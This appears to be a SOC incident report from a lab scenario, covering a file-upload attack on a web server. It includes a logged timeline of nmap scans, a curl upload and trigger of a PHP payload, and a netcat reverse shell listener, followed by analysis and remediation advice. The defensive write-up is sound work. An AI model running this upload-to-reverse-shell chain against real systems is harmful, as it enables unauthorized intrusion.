# SOC Incident Report – Web Server Attack

## Overview
This report summarizes a cyberattack carried out against an internal web server. It includes attacker and victim details, attack flow, analysis, and remediation recommendations.

## Incident Summary
- **Attacker IP:** 10.0.0.50
- **Target (Victim) IP:** 10.0.0.20
- **Attack Vector:** Unprotected file upload vulnerability
- **Malicious File Uploaded:** `reverse_proxy.php`
- **Upload Path:** `http://10.0.0.20/upload.php`
- **Incident Date:** 23/11/2025

## Attack Timeline

### 1. Reconnaissance – Port Scanning
```
2025-11-23T13:59:10+02:00 CMD="nmap -sV -p 1-1000 10.0.0.20"
2025-11-23T14:00:22+02:00 CMD="nmap -sV -p 80,443 10.0.0.20"
```

### 2. Web Application Enumeration
```
2025-11-23T14:01:08+02:00 CMD="curl -I http://10.0.0.20/"
2025-11-23T14:01:34+02:00 CMD="curl http://10.0.0.20/upload.php"
```

### 3. Exploitation – Malicious File Upload
```
2025-11-23T14:01:58+02:00 CMD="curl -F 'file=@reverse_proxy.php' http://10.0.0.20/upload.php"
```

### 4. Payload Activation
```
2025-11-23T14:02:02+02:00 CMD="curl http://10.0.0.20/uploads/reverse_proxy.php?check=1"
```

### 5. Reverse Shell Establishment
```
2025-11-23T14:02:20+02:00 CMD="nc -lvnp 4444"
2025-11-23T14:02:31+02:00 NOTE="Incoming connection observed on TCP 4444 from 10.0.0.20"
```

## Attack Analysis
1. **Port Scanning (Reconnaissance)**  
   The attacker conducted multiple Nmap scans to identify open and vulnerable services on the target server.

2. **Web Application Discovery**  
   The attacker probed the web server using cURL to inspect endpoints, including the file upload page.

3. **Exploitation of File Upload Vulnerability**  
   Due to the lack of validation on uploaded files, the attacker successfully uploaded a PHP-based malicious payload.

4. **Execution of Malicious Payload**  
   The attacker triggered the uploaded file via a direct HTTP request, activating the reverse proxy script.

5. **Reverse Shell Gained**  
   A reverse shell connection was established from the compromised server to the attacker’s listener.

## Key Findings
- **Critical file upload vulnerability:** No validation, file-type restrictions, or execution prevention.
- **Remote command execution achieved:** Reverse shell confirmed outgoing connection.
- **Log capture successful:** osquery recorded attacker commands.

## Recommendations
- Implement strict file upload validation (whitelisting).
- Disable execution permissions for the uploads directory.
- Apply proper separation of privileges for the web server.
- Deploy a WAF to detect common attack patterns.
- Enhance monitoring for reverse shell behavior and outbound anomalies.

## Appendix
Additional logs, malicious file code snippets, diagrams, or supporting evidence may be added here.
